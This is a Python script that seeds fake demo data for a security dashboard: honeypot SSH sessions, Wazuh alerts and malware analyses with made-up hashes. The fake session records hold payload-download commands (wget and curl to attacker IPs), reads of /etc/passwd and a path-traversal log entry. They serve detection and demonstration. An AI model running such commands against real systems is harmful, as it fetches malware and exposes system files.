import json
import os
from pathlib import Path
from datetime import datetime, timedelta, timezone

def seed_data():
    print("Starting demo data seeding...")
    
    # 1. Timestamps spread evenly over the last 24 hours
    now = datetime.now(timezone.utc)
    timestamps = [(now - timedelta(hours=i * 24 / 5)).isoformat() for i in range(5)]
    
    # 2. Cowrie Sessions
    cowrie_sessions = [
        {
            "session_id": "seed-cowrie-1",
            "timestamp": timestamps[0],
            "timestamp_start": timestamps[0],
            "timestamp_end": (now - timedelta(hours=0, minutes=10)).isoformat(),
            "src_ip": "185.220.101.45",
            "src_port": 49152,
            "dst_port": 2222,
            "protocol": "ssh",
            "username": "root",
            "password": "toor",
            "username_attempts": ["root"],
            "password_attempts": ["toor"],
            "commands": ["whoami"],
            "commands_executed": ["whoami"],
            "duration_seconds": 600,
            "files_downloaded": [],
            "login_success": False,
            "country": "Russia"
        },
        {
            "session_id": "seed-cowrie-2",
            "timestamp": timestamps[1],
            "timestamp_start": timestamps[1],
            "timestamp_end": (now - timedelta(hours=4.8, minutes=5)).isoformat(),
            "src_ip": "91.108.4.177",
            "src_port": 50123,
            "dst_port": 2222,
            "protocol": "ssh",
            "username": "admin",
            "password": "admin",
            "username_attempts": ["admin"],
            "password_attempts": ["admin"],
            "commands": ["uname -a"],
            "commands_executed": ["uname -a"],
            "duration_seconds": 300,
            "files_downloaded": [],
            "login_success": False,
            "country": "China"
        },
        {
            "session_id": "seed-cowrie-3",
            "timestamp": timestamps[2],
            "timestamp_start": timestamps[2],
            "timestamp_end": (now - timedelta(hours=9.6, minutes=2)).isoformat(),
            "src_ip": "198.51.100.23",
            "src_port": 52341,
            "dst_port": 2222,
            "protocol": "ssh",
            "username": "ubuntu",
            "password": "password",
            "username_attempts": ["ubuntu"],
            "password_attempts": ["password"],
            "commands": ["cat /etc/passwd"],
            "commands_executed": ["cat /etc/passwd"],
            "duration_seconds": 120,
            "files_downloaded": [],
            "login_success": False,
            "country": "Netherlands"
        },
        {
            "session_id": "seed-cowrie-4",
            "timestamp": timestamps[3],
            "timestamp_start": timestamps[3],
            "timestamp_end": (now - timedelta(hours=14.4, minutes=1)).isoformat(),
            "src_ip": "203.0.113.42",
            "src_port": 48291,
            "dst_port": 2222,
            "protocol": "ssh",
            "username": "pi",
            "password": "root",
            "username_attempts": ["pi"],
            "password_attempts": ["root"],
            "commands": ["wget http://185.220.101.45/mirai.sh"],
            "commands_executed": ["wget http://185.220.101.45/mirai.sh"],
            "duration_seconds": 60,
            "files_downloaded": ["mirai.sh"],
            "login_success": False,
            "country": "Brazil"
        },
        {
            "session_id": "seed-cowrie-5",
            "timestamp": timestamps[4],
            "timestamp_start": timestamps[4],
            "timestamp_end": (now - timedelta(hours=19.2, minutes=4)).isoformat(),
            "src_ip": "45.33.32.156",
            "src_port": 53210,
            "dst_port": 2222,
            "protocol": "ssh",
            "username": "user",
            "password": "toor",
            "username_attempts": ["user"],
            "password_attempts": ["toor"],
            "commands": ["curl http://91.108.4.177/payload.elf"],
            "commands_executed": ["curl http://91.108.4.177/payload.elf"],
            "duration_seconds": 240,
            "files_downloaded": ["payload.elf"],
            "login_success": False,
            "country": "USA"
        }
    ]
    
    # Write cowrie sessions to /tmp/seeded_sessions.json
    seeded_sessions_path = Path("/tmp/seeded_sessions.json")
    with open(seeded_sessions_path, "w") as f:
        json.dump(cowrie_sessions, f, indent=4)
    print(f"Seeded Cowrie sessions to {seeded_sessions_path}")

    # 3. Wazuh Alerts
    wazuh_alerts = [
        {
            "alert_id": "seed-wazuh-1",
            "timestamp": timestamps[0],
            "rule_id": "5710",
            "rule_level": 10,
            "severity": "high",
            "rule_description": "SSH brute force from 185.220.101.45",
            "agent_id": "001",
            "agent_name": "production-web",
            "src_ip": "185.220.101.45",
            "dst_ip": "167.172.85.62",
            "mitre_technique": "Brute Force",
            "mitre_tactic": "Credential Access",
            "full_log": "Jun  3 22:15:30 production-web sshd[12345]: Failed password for root from 185.220.101.45 port 49152 ssh2",
            "groups": ["syslog", "sshd", "authentication_failed"],
            "location": "/var/log/auth.log"
        },
        {
            "alert_id": "seed-wazuh-2",
            "timestamp": timestamps[0],
            "rule_id": "31101",
            "rule_level": 8,
            "severity": "high",
            "rule_description": "Web attack attempt",
            "agent_id": "001",
            "agent_name": "production-web",
            "src_ip": "91.108.4.177",
            "dst_ip": "167.172.85.62",
            "mitre_technique": "Exploit Public-Facing Application",
            "mitre_tactic": "Initial Access",
            "full_log": "Jun  3 22:16:12 production-web nginx: 91.108.4.177 - - [03/Jun/2026:22:16:12 +0000] \"GET /index.php?file=../../../../etc/passwd HTTP/1.1\" 400 166 \"-\" \"Mozilla/5.0\"",
            "groups": ["web", "nginx", "attack"],
            "location": "/var/log/nginx/access.log"
        },
        {
            "alert_id": "seed-wazuh-3",
            "timestamp": timestamps[1],
            "rule_id": "1002",
            "rule_level": 3,
            "severity": "low",
            "rule_description": "Unknown problem somewhere in the system",
            "agent_id": "002",
            "agent_name": "db-server",
            "src_ip": None,
            "dst_ip": None,
            "mitre_technique": None,
            "mitre_tactic": None,
            "full_log": "Jun  3 18:40:22 db-server kernel: [12345.6789] random network hiccup detected on interface eth0",
            "groups": ["kernel", "system"],
            "location": "/var/log/syslog"
        },
        {
            "alert_id": "seed-wazuh-4",
            "timestamp": timestamps[1],
            "rule_id": "5710",
            "rule_level": 10,
            "severity": "high",
            "rule_description": "SSH brute force from 185.220.101.45",
            "agent_id": "001",
            "agent_name": "production-web",
            "src_ip": "185.220.101.45",
            "dst_ip": "167.172.85.62",
            "mitre_technique": "Brute Force",
            "mitre_tactic": "Credential Access",
            "full_log": "Jun  3 17:30:15 production-web sshd[12348]: Failed password for root from 185.220.101.45 port 49160 ssh2",
            "groups": ["syslog", "sshd", "authentication_failed"],
            "location": "/var/log/auth.log"
        },
        {
            "alert_id": "seed-wazuh-5",
            "timestamp": timestamps[2],
            "rule_id": "31101",
            "rule_level": 5,
            "severity": "medium",
            "rule_description": "Web attack attempt",
            "agent_id": "001",
            "agent_name": "production-web",
            "src_ip": "198.51.100.23",
            "dst_ip": "167.172.85.62",
            "mitre_technique": "Exploit Public-Facing Application",
            "mitre_tactic": "Initial Access",
            "full_log": "Jun  3 13:45:00 production-web nginx: 198.51.100.23 - - [03/Jun/2026:13:45:00 +0000] \"GET /admin/login.php HTTP/1.1\" 404 150 \"-\" \"curl/7.68.0\"",
            "groups": ["web", "nginx", "scan"],
            "location": "/var/log/nginx/access.log"
        },
        {
            "alert_id": "seed-wazuh-6",
            "timestamp": timestamps[2],
            "rule_id": "1002",
            "rule_level": 2,
            "severity": "low",
            "rule_description": "Unknown problem somewhere in the system",
            "agent_id": "001",
            "agent_name": "production-web",
            "src_ip": None,
            "dst_ip": None,
            "mitre_technique": None,
            "mitre_tactic": None,
            "full_log": "Jun  3 12:10:05 production-web CRON[9988]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))",
            "groups": ["cron", "system"],
            "location": "/var/log/syslog"
        },
        {
            "alert_id": "seed-wazuh-7",
            "timestamp": timestamps[3],
            "rule_id": "5710",
            "rule_level": 10,
            "severity": "high",
            "rule_description": "SSH brute force from 185.220.101.45",
            "agent_id": "001",
            "agent_name": "production-web",
            "src_ip": "185.220.101.45",
            "dst_ip": "167.172.85.62",
            "mitre_technique": "Brute Force",
            "mitre_tactic": "Credential Access",
            "full_log": "Jun  3 08:20:00 production-web sshd[12390]: Failed password for admin from 185.220.101.45 port 49170 ssh2",
            "groups": ["syslog", "sshd", "authentication_failed"],
            "location": "/var/log/auth.log"
        },
        {
            "alert_id": "seed-wazuh-8",
            "timestamp": timestamps[3],
            "rule_id": "31101",
            "rule_level": 9,
            "severity": "high",
            "rule_description": "Web attack attempt",
            "agent_id": "001",
            "agent_name": "production-web",
            "src_ip": "203.0.113.42",
            "dst_ip": "167.172.85.62",
            "mitre_technique": "Exploit Public-Facing Application",
            "mitre_tactic": "Initial Access",
            "full_log": "Jun  3 07:15:30 production-web nginx: 203.0.113.42 - - [03/Jun/2026:07:15:30 +0000] \"POST /xmlrpc.php HTTP/1.1\" 200 450 \"-\" \"WordPress/5.8\"",
            "groups": ["web", "nginx", "attack"],
            "location": "/var/log/nginx/access.log"
        },
        {
            "alert_id": "seed-wazuh-9",
            "timestamp": timestamps[4],
            "rule_id": "1002",
            "rule_level": 4,
            "severity": "medium",
            "rule_description": "Unknown problem somewhere in the system",
            "agent_id": "002",
            "agent_name": "db-server",
            "src_ip": None,
            "dst_ip": None,
            "mitre_technique": None,
            "mitre_tactic": None,
            "full_log": "Jun  3 04:30:10 db-server systemd[1]: postgresql.service: Command exec: syslog threshold exceeded",
            "groups": ["systemd", "database"],
            "location": "/var/log/syslog"
        },
        {
            "alert_id": "seed-wazuh-10",
            "timestamp": timestamps[4],
            "rule_id": "5710",
            "rule_level": 10,
            "severity": "high",
            "rule_description": "SSH brute force from 185.220.101.45",
            "agent_id": "001",
            "agent_name": "production-web",
            "src_ip": "185.220.101.45",
            "dst_ip": "167.172.85.62",
            "mitre_technique": "Brute Force",
            "mitre_tactic": "Credential Access",
            "full_log": "Jun  3 02:10:00 production-web sshd[12410]: Failed password for user from 185.220.101.45 port 49180 ssh2",
            "groups": ["syslog", "sshd", "authentication_failed"],
            "location": "/var/log/auth.log"
        }
    ]
    
    # Write wazuh alerts to /tmp/seeded_wazuh_alerts.json
    seeded_wazuh_alerts_path = Path("/tmp/seeded_wazuh_alerts.json")
    with open(seeded_wazuh_alerts_path, "w") as f:
        json.dump(wazuh_alerts, f, indent=4)
    print(f"Seeded Wazuh alerts to {seeded_wazuh_alerts_path}")

    # 4. Analysis Results (3 entries)
    samples_dir = Path("/tmp/samples")
    samples_dir.mkdir(parents=True, exist_ok=True)
    
    analyses = [
        {
            "analysis_id": "a3f1e2d4b5c6789012345678901234567890abcdef1234567890abcdef123456",
            "status": "complete",
            "created_at": (now - timedelta(hours=2)).isoformat(),
            "file_name": "mirai_sample.elf",
            "static_analysis": {
                "file_name": "mirai_sample.elf",
                "file_size": 124928,
                "file_type": "ELF",
                "md5": "a3f1e2d4b5c678901234567890123456",
                "sha1": "a3f1e2d4b5c6789012345678901234567890abcd",
                "sha256": "a3f1e2d4b5c6789012345678901234567890abcdef1234567890abcdef123456",
                "pe_sections": [],
                "imports": [],
                "strings_extracted": ["whoami", "uname -a", "cat /etc/passwd", "mirai.sh"],
                "yara_hits": [],
                "is_packed": False,
                "compile_timestamp": None,
                "entry_point": "0x400080"
            },
            "groq_analysis": {
                "malware_family": "Mirai",
                "confidence": 95,
                "behavior_summary": "ELF binary identified as Mirai variant. Contains hardcoded C2 IPs, brute force module targeting Telnet/SSH, DDoS capability.",
                "mitre_techniques": [
                    {
                        "technique_id": "T1059.004",
                        "technique_name": "Unix Shell",
                        "tactic": "Execution",
                        "description": "Execution of commands in Unix shell.",
                        "confidence": 95
                    },
                    {
                        "technique_id": "T1071.001",
                        "technique_name": "Web Protocols",
                        "tactic": "Command and Control",
                        "description": "Use of HTTP for C2 communication.",
                        "confidence": 90
                    },
                    {
                        "technique_id": "T1498",
                        "technique_name": "Network Denial of Service",
                        "tactic": "Impact",
                        "description": "DDoS capability detected.",
                        "confidence": 85
                    }
                ],
                "iocs": {
                    "ips": ["185.220.101.45"],
                    "domains": [],
                    "urls": ["http://185.220.101.45/mirai.sh"],
                    "hashes": ["a3f1e2d4b5c6789012345678901234567890abcdef1234567890abcdef123456"],
                    "registry_keys": [],
                    "file_paths": [],
                    "mutexes": []
                },
                "risk_level": "HIGH",
                "recommended_actions": ["Isolate infected host", "Block C2 IP 185.220.101.45"],
                "analyst_notes": "Mirai botnet sample",
                "raw_response": ""
            },
            "virustotal": {
                "detection_ratio": "45/72",
                "detections": 45,
                "total_engines": 72,
                "malicious": 45,
                "suspicious": 0,
                "undetected": 27,
                "engine_hits": [],
                "first_seen": "2026-06-01T00:00:00Z",
                "last_seen": "2026-06-03T00:00:00Z",
                "community_score": 45,
                "vt_link": "https://www.virustotal.com/gui/file/a3f1e2d4b5c6789012345678901234567890abcdef1234567890abcdef123456",
                "family_names": ["Mirai"]
            },
            "error": None,
            "risk_level": "HIGH"
        },
        {
            "analysis_id": "b4c2f3e5a6d7890123456789012345678901bcdef2345678901bcdef234567",
            "status": "complete",
            "created_at": (now - timedelta(hours=6)).isoformat(),
            "file_name": "reverse_shell.sh",
            "static_analysis": {
                "file_name": "reverse_shell.sh",
                "file_size": 256,
                "file_type": "Shell Script",
                "md5": "b4c2f3e5a6d78901234567890123456",
                "sha1": "b4c2f3e5a6d789012345678901234567890abcd",
                "sha256": "b4c2f3e5a6d7890123456789012345678901bcdef2345678901bcdef234567",
                "pe_sections": [],
                "imports": [],
                "strings_extracted": ["/bin/bash", "tcp", "sh"],
                "yara_hits": [],
                "is_packed": False,
                "compile_timestamp": None,
                "entry_point": ""
            },
            "groq_analysis": {
                "malware_family": "Reverse Shell",
                "confidence": 90,
                "behavior_summary": "Bash script implementing a reverse shell connection.",
                "mitre_techniques": [
                    {
                        "technique_id": "T1059.004",
                        "technique_name": "Unix Shell",
                        "tactic": "Execution",
                        "description": "Executes bash commands.",
                        "confidence": 95
                    },
                    {
                        "technique_id": "T1095",
                        "technique_name": "Non-Application Layer Protocol",
                        "tactic": "Command and Control",
                        "description": "Establishes raw TCP connection for reverse shell.",
                        "confidence": 90
                    }
                ],
                "iocs": {
                    "ips": ["91.108.4.177"],
                    "domains": [],
                    "urls": ["http://91.108.4.177/payload.elf"],
                    "hashes": ["b4c2f3e5a6d7890123456789012345678901bcdef2345678901bcdef234567"],
                    "registry_keys": [],
                    "file_paths": [],
                    "mutexes": []
                },
                "risk_level": "HIGH",
                "recommended_actions": ["Block egress traffic to 91.108.4.177", "Terminate active shell processes"],
                "analyst_notes": "Bash reverse shell script",
                "raw_response": ""
            },
            "virustotal": {
                "detection_ratio": "15/60",
                "detections": 15,
                "total_engines": 60,
                "malicious": 15,
                "suspicious": 0,
                "undetected": 45,
                "engine_hits": [],
                "first_seen": "2026-06-02T00:00:00Z",
                "last_seen": "2026-06-03T00:00:00Z",
                "community_score": 15,
                "vt_link": "https://www.virustotal.com/gui/file/b4c2f3e5a6d7890123456789012345678901bcdef2345678901bcdef234567",
                "family_names": ["Shellscript"]
            },
            "error": None,
            "risk_level": "HIGH"
        },
        {
            "analysis_id": "c5d3g4f6b7e8901234567890123456789012cdef3456789012cdef3456789",
            "status": "complete",
            "created_at": (now - timedelta(hours=12)).isoformat(),
            "file_name": "cryptominer.elf",
            "static_analysis": {
                "file_name": "cryptominer.elf",
                "file_size": 2048576,
                "file_type": "ELF",
                "md5": "c5d3g4f6b7e890123456789012345678",
                "sha1": "c5d3g4f6b7e89012345678901234567890abcd",
                "sha256": "c5d3g4f6b7e8901234567890123456789012cdef3456789012cdef3456789",
                "pe_sections": [],
                "imports": [],
                "strings_extracted": ["xmrig", "pool.supportxmr.com"],
                "yara_hits": [],
                "is_packed": False,
                "compile_timestamp": None,
                "entry_point": "0x401000"
            },
            "groq_analysis": {
                "malware_family": "XMRig Miner",
                "confidence": 85,
                "behavior_summary": "ELF binary identified as XMRig miner. Utilizes system resources for cryptocurrency mining.",
                "mitre_techniques": [
                    {
                        "technique_id": "T1496",
                        "technique_name": "Resource Hijacking",
                        "tactic": "Impact",
                        "description": "Cryptocurrency mining activity.",
                        "confidence": 90
                    }
                ],
                "iocs": {
                    "ips": [],
                    "domains": [],
                    "urls": [],
                    "hashes": ["c5d3g4f6b7e8901234567890123456789012cdef3456789012cdef3456789"],
                    "registry_keys": [],
                    "file_paths": ["/tmp/xmrig"],
                    "mutexes": []
                },
                "risk_level": "LOW",  # Low risk so threatCount is exactly 2
                "recommended_actions": ["Kill xmrig processes", "Remove binary from /tmp/xmrig"],
                "analyst_notes": "XMRig Miner",
                "raw_response": ""
            },
            "virustotal": {
                "detection_ratio": "8/68",
                "detections": 8,
                "total_engines": 68,
                "malicious": 8,
                "suspicious": 0,
                "undetected": 60,
                "engine_hits": [],
                "first_seen": "2026-05-30T00:00:00Z",
                "last_seen": "2026-06-03T00:00:00Z",
                "community_score": 8,
                "vt_link": "https://www.virustotal.com/gui/file/c5d3g4f6b7e8901234567890123456789012cdef3456789012cdef3456789",
                "family_names": ["XMRig"]
            },
            "error": None,
            "risk_level": "LOW"
        }
    ]
    
    for analysis in analyses:
        sha256 = analysis["analysis_id"]
        dir_path = samples_dir / sha256
        dir_path.mkdir(parents=True, exist_ok=True)
        
        # Write result.json
        result_path = dir_path / "result.json"
        with open(result_path, "w") as f:
            json.dump(analysis, f, indent=4)
            
        # Write dummy original file
        original_path = dir_path / "original"
        with open(original_path, "w") as f:
            f.write("Seeded original file bytes")
            
        print(f"Seeded analysis result to {result_path}")
        
    print("Demo data seeding completed successfully.")

if __name__ == "__main__":
    seed_data()
